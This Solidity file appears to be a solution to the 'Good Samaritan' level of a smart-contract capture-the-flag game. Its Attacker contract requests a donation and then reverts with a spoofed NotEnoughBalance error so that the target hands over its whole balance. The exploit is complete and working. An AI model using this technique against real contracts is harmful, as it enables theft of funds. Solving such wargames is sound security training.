// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "../lv27_good_samaritan.sol";

contract Attacker is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan goodSamaritan;
    constructor(address instance_ad) {
        goodSamaritan = GoodSamaritan(instance_ad);
    }

    function attack() external returns (bool enoughBalance) {
        enoughBalance = goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
